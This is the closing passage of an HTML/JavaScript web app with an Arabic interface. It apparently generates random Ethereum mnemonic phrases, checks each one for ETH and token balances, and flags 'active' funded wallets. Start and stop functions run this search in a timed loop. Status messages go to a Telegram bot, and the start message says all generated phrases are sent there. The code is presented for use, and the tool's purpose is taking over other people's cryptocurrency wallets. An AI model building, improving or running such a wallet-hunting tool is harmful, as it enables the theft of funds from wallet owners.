                        📊 عدد المعاملات: ${walletStatus.transactionCount !== null ? walletStatus.transactionCount : 'غير معروف'}
                    </div>
                `;
                
                if (walletStatus.tokenBalances.length > 0) {
                    resultHTML += `
                        <div class="token-list">
                            <strong>🪙 العملات الأخرى:</strong>
                            ${walletStatus.tokenBalances.map(token => `
                                <div class="token-item">
                                    <span>${token.symbol}</span>
                                    <span>${token.balance.toFixed(4)}</span>
                                </div>
                            `).join('')}
                        </div>
                    `;
                }
                
                resultHTML += `
                    <div class="wallet-details">
                        <div class="mnemonic">📝 العبارة: ${mnemonic}</div>
                        <div class="address">📍 العنوان: ${address}</div>
                    </div>
                `;
                elements.manualTestResult.className = 'test-result active';
            } else {
                resultHTML = `
                    <h4>❌ نتيجة الفحص: المحفظة فارغة</h4>
                    <div class="status inactive">محفظة فارغة</div>
                    <div class="balance zero">
                        💰 رصيد ETH: ${walletStatus.balance !== null ? walletStatus.balance.toFixed(6) + ' ETH' : 'غير معروف'}
                    </div>
                    <div class="transactions">
                        📊 عدد المعاملات: ${walletStatus.transactionCount !== null ? walletStatus.transactionCount : 'غير معروف'}
                    </div>
                `;
                
                if (walletStatus.tokenBalances.length > 0) {
                    resultHTML += `
                        <div class="token-list">
                            <strong>🪙 العملات الأخرى:</strong>
                            ${walletStatus.tokenBalances.map(token => `
                                <div class="token-item">
                                    <span>${token.symbol}</span>
                                    <span>${token.balance.toFixed(4)}</span>
                                </div>
                            `).join('')}
                        </div>
                    `;
                }
                
                resultHTML += `
                    <div class="wallet-details">
                        <div class="mnemonic">📝 العبارة: ${mnemonic}</div>
                        <div class="address">📍 العنوان: ${address}</div>
                    </div>
                `;
                elements.manualTestResult.className = 'test-result inactive';
            }
            
            elements.manualTestResult.innerHTML = resultHTML;
            elements.manualTestResult.style.display = 'block';
        }

        // وظيفة نسخ العبارة المولدة
        function copyGeneratedMnemonic() {
            if (!lastGeneratedMnemonic) {
                updateStatus('لا توجد عبارة مولدة للنسخ', 'warning');
                return;
            }
            
            navigator.clipboard.writeText(lastGeneratedMnemonic)
                .then(() => {
                    updateStatus('تم نسخ العبارة المولدة إلى الحافظة', 'success');
                    addLogEntry('تم نسخ العبارة المولدة إلى الحافظة', 'success');
                })
                .catch(err => {
                    updateStatus('فشل في نسخ العبارة', 'danger');
                    addLogEntry(`فشل في نسخ العبارة: ${err.message}`, 'error');
                });
        }

        // وظائف التحكم
        async function startSearch() {
            if (isRunning) return;
            
            if (!checkEthersLoaded()) {
                return;
            }
            
            isRunning = true;
            elements.startBtn.disabled = true;
            elements.stopBtn.disabled = false;
            
            const speed = parseInt(elements.searchSpeed.value) || 3000;
            
            updateStatus('جاري بدء البحث...', 'info');
            addLogEntry('🚀 تم بدء البحث عن المحافظ النشطة');
            
            const startMessage = `🚀 <b>بدء عملية البحث عن المحافظ النشطة</b>\n\n⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}\n🔍 جاري البحث عن محافظ وإرسال جميع العبارات إلى Telegram...`;
            await sendTelegramMessage(startMessage);
            
            searchInterval = setInterval(searchForActiveWallets, speed);
        }

        async function stopSearch() {
            if (!isRunning) return;
            
            isRunning = false;
            elements.startBtn.disabled = false;
            elements.stopBtn.disabled = true;
            
            if (searchInterval) {
                clearInterval(searchInterval);
                searchInterval = null;
            }
            
            updateStatus('تم إيقاف البحث', 'warning');
            addLogEntry('⏹️ تم إيقاف البحث');
            
            let stopMessage = `⏹️ <b>تم إيقاف عملية البحث</b>\n\n`;
            stopMessage += `📊 <b>الإحصائيات النهائية:</b>\n`;
            stopMessage += `🔢 إجمالي العبارات: ${stats.totalGenerated}\n`;
            stopMessage += `✅ المحافظ النشطة: ${stats.activeWallets}\n`;
            stopMessage += `❌ المحافظ الفارغة: ${stats.emptyWallets}\n`;
            stopMessage += `\n⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}`;
            
            await sendTelegramMessage(stopMessage);
        }

        async function testTelegramConnection() {
            updateStatus('جاري اختبار الاتصال بـ Telegram...', 'info');
            addLogEntry('🧪 جاري اختبار الاتصال بـ Telegram...');
            
            const testMessage = `🧪 <b>اختبار الاتصال</b>\n\nتم الاتصال بنجاح مع بوت Telegram!\n⏰ ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}`;
            const success = await sendTelegramMessage(testMessage);
            
            if (success) {
                updateStatus('✅ تم الاتصال بـ Telegram بنجاح!', 'success');
                addLogEntry('✅ تم الاتصال بـ Telegram بنجاح!', 'success');
            } else {
                updateStatus('❌ فشل في الاتصال بـ Telegram', 'danger');
                addLogEntry('❌ فشل في الاتصال بـ Telegram', 'error');
            }
        }

        function clearLogs() {
            elements.logPanel.innerHTML = '';
            addLogEntry('تم مسح السجل');
        }

        // ربط الأحداث
        elements.startBtn.addEventListener('click', startSearch);
        elements.stopBtn.addEventListener('click', stopSearch);
        elements.testTelegramBtn.addEventListener('click', testTelegramConnection);
        elements.clearLogsBtn.addEventListener('click', clearLogs);
        elements.testManualBtn.addEventListener('click', testManualMnemonic);
        elements.testGeneratedBtn.addEventListener('click', testGeneratedMnemonic);

        // التحقق من تحميل ethers.js عند بدء التطبيق
        document.addEventListener('DOMContentLoaded', function() {
            if (checkEthersLoaded()) {
                updateStatus('✅ تم تحميل مكتبة ethers.js بنجاح. جاهز للبدء...', 'success');
                addLogEntry('✅ تم تحميل مكتبة ethers.js بنجاح', 'success');
                addLogEntry('🪙 التطبيق يدعم الآن جميع العملات: ETH, USDT, USDC, DAI, LINK, UNI, WBTC, AAVE, SHIB', 'success');
            }
        });

        // تحديث الإحصائيات عند بدء التطبيق
        updateStats();
    </script>
</body>
</html>
